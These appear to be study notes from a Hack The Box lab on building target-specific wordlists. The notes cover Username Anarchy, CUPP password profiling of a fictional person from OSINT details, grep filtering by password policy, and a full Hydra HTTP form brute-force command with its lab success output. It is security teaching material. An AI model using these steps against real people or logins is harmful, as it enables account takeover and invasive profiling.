![Image](https://images.openai.com/static-rsc-4/rPRc1oU0TgXzhI2qdzCJMgbfVSUXe8ewMMFlUOK7XJxtFoQIx-Vm2rhBRzn9us9FLSCbvsmtg8s_-FFkSNkgGsbFZ289P-jCswkiVuwpjDzULSmS8a1nPjhh4ZKKZvQYguS8MfNlBIFtnuLLNP8T3gtR7ULbE1wPDXtzFFu2j4zVSbm3D-_zhsqAAzoKHsyG?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/gu47-C449-53_jmkPI5KnfILQZJONSSl7XL37qUj9GZYzpSHuUOwX-SItJV76pzh65swzGRosCBIJHTkeOn7GKIjKhCVMFv8vAhAFjgYWpCdw6eaHNnxhoTfaXDsOlBNwBz54IaVc9MZ4t9JP_TIiGmCZDpa41V9otwd3nuQIVB7B1dk_fIv3wPMUnwxBzpq?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/eC6wFY4GR1GbTZ-8iIbzjscvrzjoMjr0G7tVekyoZPweTx_wG1vls-wl_ihml9wVD2tHhuzcpbvOP5uABIB8PEqNxMNoIm8FgW-6ujuQvXOxPMfK16wCa_hF_KRzFYs9NI7cl96v8CFqO-h4W9sRHLnsrXLmU-YQwXKXAReUCG3X2ReG6kx8mYikW7ZdqWiM?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/goiH64t2j3teNm0GdX1_Xk01JiSTyAz0lMzBZ3782lWPG2KYP6J7dxCQ92pglnAvtORsA3E52VEGNIcZJKsOy09YBLnmjylLuSRNrT6iYxVmAZxLAhiwRj19TZVfAUUIhqibgLD18rsQqwIRNx15exCk-dqfLg_WVa-7n_TF4eIwYhvghgpugvoECkMGsysT?purpose=fullsize)

---

# 1. What Are Custom Wordlists?

Pre-made lists such as:

```text
rockyou
SecLists
```

contain huge numbers of potential usernames and passwords.

They are useful because they cover a broad range of possibilities.

However, the downside is:

```text
Huge generic list
       ↓
Many irrelevant candidates
       ↓
More attempts
       ↓
More time/resources
```

Custom wordlists take the opposite approach:

```text
Information about target
       ↓
Generate relevant candidates
       ↓
Smaller / focused list
       ↓
More efficient testing
```

The source describes this as tailoring the wordlist to the specific target and environment.

---

# 2. Generic vs Custom Wordlists ⭐

|Generic Wordlist|Custom Wordlist|
|---|---|
|Broad|Targeted|
|Very large|Usually more focused|
|Many irrelevant entries|More relevant entries|
|Doesn't necessarily reflect target conventions|Can reflect target conventions|
|Potentially more attempts|Potentially fewer attempts|

### Key idea

> **A good wordlist isn't necessarily the biggest wordlist; it is the one that best matches the target's likely credential patterns.**

---

# 3. Example — Username Conventions

Imagine a company employee:

```text
Jane Smith
```

A company could use usernames such as:

```text
jane
smith
janesmith
jane.smith
j.smith
smithj
```

or more complicated conventions.

Therefore, blindly searching a massive username database may be less useful than generating candidates based specifically on:

```text
First name
Last name
Initials
Company naming convention
```

---

# 4. Username Anarchy

## What is Username Anarchy?

**Username Anarchy** generates potential username combinations from names.

Instead of manually thinking of every possible variation, the tool generates many common naming patterns automatically.

The source specifically describes it as accounting for things such as:

- Initials
    
- Common substitutions
    
- Name combinations
    
- Different capitalization patterns
    

---

# 5. Username Anarchy Examples

The source shows plugin patterns including:

```text
first
firstlast
first.last
firstlast[8]
first[4]last[4]
firstl
f.last
flast
lfirst
l.first
lastf
last
last.f
last.first
FLast
first1
fl
fmlast
firstmiddlelast
fml
FL
FirstLast
First.Last
Last
```

For a hypothetical:

```text
Anna Key
```

examples could include:

```text
anna
annakey
anna.key
a.key
akey
keyanna
key.anna
key
```

---

# 6. Installing Username Anarchy

The source uses Ruby and Git:

```bash
sudo apt install ruby -y
```

Then:

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
```

Enter the directory:

```bash
cd username-anarchy
```

---

# 7. Generating Usernames

For the example target:

```text
Jane Smith
```

the source uses:

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

The output is redirected into:

```text
jane_smith_usernames.txt
```

### Result

Instead of manually creating:

```text
jane
smith
janesmith
jane.smith
j.smith
```

Username Anarchy generates a much broader candidate set.

The source highlights basic combinations and initials among the generated possibilities.

---

# 8. 🧠 Username Anarchy Mental Model

```text
             Jane Smith
                 │
                 ↓
        Username Anarchy
                 │
       ┌─────────┼─────────┐
       ↓         ↓         ↓
     Names     Initials   Variations
       │         │         │
       └─────────┼─────────┘
                 ↓
     jane_smith_usernames.txt
```

---

# 9. CUPP

Once potential usernames have been generated, the next challenge is password candidates.

The source introduces:

> **CUPP — Common User Passwords Profiler**

CUPP creates personalized password wordlists using information gathered about a target.

### Core concept

```text
Target information
       ↓
CUPP
       ↓
Password variations
       ↓
Personalized wordlist
```

---

# 10. Why Target Information Matters

The source emphasizes that CUPP's effectiveness depends heavily on the quality and depth of the information provided.

For the fictional Jane Smith example, information could include:

- Name
    
- Nickname
    
- Birthdate
    
- Partner
    
- Pet
    
- Company
    
- Interests
    
- Favorite colors
    

The source's example profile contains:

|Field|Example|
|---|---|
|Name|Jane Smith|
|Nickname|Janey|
|Birthdate|December 11, 1990|
|Partner|Jim|
|Partner nickname|Jimbo|
|Pet|Spot|
|Company|AHI|
|Interests|Hackers, Pizza, Golf, Horses|
|Favorite color|Blue|

---

# 11. OSINT and CUPP

The source identifies several possible information sources:

### Social Media

Potentially contains:

- Birthdays
    
- Pet names
    
- Quotes
    
- Interests
    
- Travel information
    
- Relationships
    

### Company Websites

May reveal:

- Name
    
- Job position
    
- Professional information
    

### Public Records

Depending on jurisdiction and applicable privacy laws, may contain various publicly available information.

### News Articles / Blogs

Can reveal:

- Interests
    
- Achievements
    
- Affiliations
    

### Important concept

```text
OSINT
 ↓
Target information
 ↓
CUPP
 ↓
Personalized password candidates
```

---

# 12. How CUPP Creates Variations

The source gives examples of the types of transformations CUPP can generate:

### Original / Capitalized

```text
jane
Jane
```

### Reversed

```text
enaj
enaJ
```

### Date-related

```text
jane1994
smith2708
```

### Concatenation

```text
janesmith
smithjane
```

### Special characters

```text
jane!
smith@
```

### Numbers

```text
jane123
smith2024
```

### Leetspeak

```text
j4n3
5m1th
```

### Combined mutations

```text
Jane1994!
smith2708@
```

---

# 13. Why This Is Called a Custom Wordlist

Compare:

```text
Generic:
rockyou
```

with:

```text
Target-specific:
jane.txt
```

The second list is constructed around a particular target profile.

Therefore:

```text
Generic wordlist
      ↓
Millions of unrelated candidates

Custom wordlist
      ↓
Candidates related to target
```

The source explains that this focused approach can dramatically increase the likelihood that relevant password patterns are represented.

---

# 14. Installing CUPP

On Pwnbox, CUPP may already be installed.

Otherwise:

```bash
sudo apt install cupp -y
```

---

# 15. Interactive CUPP Mode

Run:

```bash
cupp -i
```

The `-i` option launches interactive mode.

CUPP then asks for information about the target.

For the example:

```text
First Name: Jane
Surname: Smith
Nickname: Janey
Birthdate: 11121990
```

and additional information such as partner, pet, and company.

---

# 16. Additional CUPP Options

The example also chooses to add:

```text
Keywords
Special characters
Random numbers
Leetspeak
```

For example:

```text
hacker
blue
```

are supplied as keywords.

The source shows the corresponding interactive options for adding special characters, numbers, and leet transformations.

---

# 17. CUPP Output

CUPP generates:

```text
jane.txt
```

The example reports:

```text
Saving dictionary to jane.txt, counting 46790 words.
```

So we now have:

```text
jane_smith_usernames.txt
        +
jane.txt
```

These are the customized username and password candidate lists.

---

# 18. ⭐ Password Policy Filtering

Now comes an important connection to your earlier **Hybrid Attacks** notes.

The fictional company `AHI` has this policy:

### Minimum length

```text
6 characters
```

### Must contain

```text
At least one uppercase letter
At least one lowercase letter
At least one number
At least two special characters
```

Special characters must come from:

```text
!@#$%^&*
```

---

# 19. Why Filter the CUPP List?

CUPP generated approximately:

```text
46,000+
```

candidates.

But many don't comply with the target's password policy.

Instead of testing every generated candidate:

```text
46,000 candidates
        ↓
Filter using policy
        ↓
~7,900 candidates
```

The search space becomes substantially smaller.

The source reports approximately **7,900** remaining candidates.

---

# 20. The `grep` Filtering Command

The source uses:

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Let's understand each stage.

---

# 21. Minimum Length

```bash
grep -E '^.{6,}$'
```

Means:

```text
At least 6 characters
```

Conceptually:

```text
Password
   ↓
Length ≥ 6?
   ↓
Keep / discard
```

---

# 22. Uppercase Requirement

```bash
grep -E '[A-Z]'
```

Keeps passwords containing at least one uppercase letter.

Examples:

```text
Jane123!
```

would satisfy this condition.

---

# 23. Lowercase Requirement

```bash
grep -E '[a-z]'
```

Keeps passwords containing at least one lowercase letter.

---

# 24. Number Requirement

```bash
grep -E '[0-9]'
```

Keeps passwords containing at least one number.

---

# 25. Two Special Characters

The final filter is:

```bash
grep -E '([!@#$%^&*].*){2,}'
```

This checks for at least two occurrences from the specified special-character set.

The permitted set is:

```text
! @ # $ % ^ & *
```

---

# 26. Complete Filtering Pipeline

Think of the command as a series of filters:

```text
                    jane.txt
                 ~46,000 entries
                       │
                       ↓
                 Length ≥ 6
                       │
                       ↓
               Has uppercase?
                       │
                       ↓
               Has lowercase?
                       │
                       ↓
                 Has number?
                       │
                       ↓
          Has ≥2 allowed specials?
                       │
                       ↓
               jane-filtered.txt
                  ~7,900 entries
```

This is essentially **search-space reduction**.

---

# 27. Why This Is Related to Hybrid Attacks

This section connects strongly with your previous notes.

Previously, you learned:

```text
Dictionary
   +
Mutations
   ↓
Hybrid attack
```

CUPP essentially creates many **targeted mutations** based on information about the target.

Then `grep` reduces those candidates according to known password-policy constraints.

So:

```text
OSINT
 ↓
CUPP
 ↓
Personalized candidates
 ↓
Policy filtering
 ↓
Smaller candidate set
```

---

# 28. Final Hydra Stage

The source then uses the generated lists with Hydra:

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

This is the same **HTTP POST form** concept you studied earlier.

---

# 29. Hydra Command Breakdown

### Username list

```text
-L jane_smith_usernames.txt
```

Hydra obtains username candidates from the Username Anarchy output.

### Password list

```text
-P jane-filtered.txt
```

Hydra uses the CUPP-generated and policy-filtered passwords.

### Target

```text
IP
```

The authorized HTB target.

### Port

```text
-s PORT
```

The target's HTTP port.

### Stop after success

```text
-f
```

### Authentication module

```text
http-post-form
```

### Login path

```text
/
```

### Parameters

```text
username=^USER^&password=^PASS^
```

### Failure condition

```text
Invalid credentials
```

---

# 30. Complete Attack Architecture

```text
             TARGET INFORMATION
                    │
                    ↓
              ┌───────────┐
              │    OSINT   │
              └─────┬─────┘
                    │
          ┌─────────┴─────────┐
          ↓                   ↓
 Username information    Password information
          │                   │
          ↓                   ↓
 Username Anarchy          CUPP
          │                   │
          ↓                   ↓
 Username list            Password list
          │                   │
          │                   ↓
          │              Password policy
          │                   │
          │                   ↓
          │             grep filtering
          │                   │
          │                   ↓
          │              Filtered list
          │                   │
          └─────────┬─────────┘
                    ↓
                  Hydra
                    │
                    ↓
             HTTP POST form
                    │
                    ↓
              Test candidates
                    │
                    ↓
             Valid credentials
                    │
                    ↓
              Authorized access
```

---

# 31. Understanding the Hydra Output

The source shows:

```text
[DATA] ... 655060 login tries
(l:14/p:46790)
```

This illustrates the number of possible username/password combinations being tested.

The theoretical calculation shown by those counts is:

[  
14 \times 46,790 = 655,060  
]

So:

```text
14 usernames
       ×
46,790 passwords
       =
655,060 combinations
```

This is a great example of why **reducing the candidate lists matters**.

---

# 32. Success

The example reports:

```text
[STATUS] attack finished for IP (valid pair found)
```

and:

```text
1 of 1 target successfully completed, 1 valid password found
```

The source then instructs the learner to log into the website using the discovered credentials and retrieve the flag.

---

# 33. ⭐ The Most Important Concepts

## Custom Wordlist

A wordlist specifically tailored to the target.

## Username Anarchy

Generates many possible username formats from names.

## CUPP

Creates personalized password candidates based on target information.

## OSINT

Information gathering that can provide inputs for targeted wordlist generation.

## `grep`

Filters candidate passwords according to known requirements.

## Search-space reduction

Removes candidates that cannot satisfy the target's known password policy.

## Hydra

Automates testing of the resulting username/password combinations against the authorized login form.

---

# 34. 🔥 Commands to Remember

### Username Anarchy

```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### Install CUPP

```bash
sudo apt install cupp -y
```

### Interactive CUPP

```bash
cupp -i
```

### Filter password list

```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

### Hydra

```bash
hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

These commands are from the provided HTB material; use them only against systems you're authorized to test.

---

# 🧠 Final Revision Sheet

```text
GENERIC WORDLIST
      │
      ↓
Too broad / many irrelevant candidates
      │
      ↓
CUSTOM WORDLIST
      │
      ├───────────────┐
      ↓               ↓
Username          Password
      │               │
      ↓               ↓
Username           CUPP
Anarchy              │
      │               ↓
      │          Personalized
      │          password list
      │               │
      │               ↓
      │          Password policy
      │               │
      │               ↓
      │             grep
      │               │
      └───────┬───────┘
              ↓
            Hydra
              ↓
        HTTP POST form
              ↓
       Candidate testing
              ↓
       Valid credentials
```

### 🎯 One-sentence takeaway

> **Custom wordlists improve credential-testing efficiency by using target-specific information to generate likely usernames and passwords, then filtering those candidates according to known password-policy requirements before authorized testing.**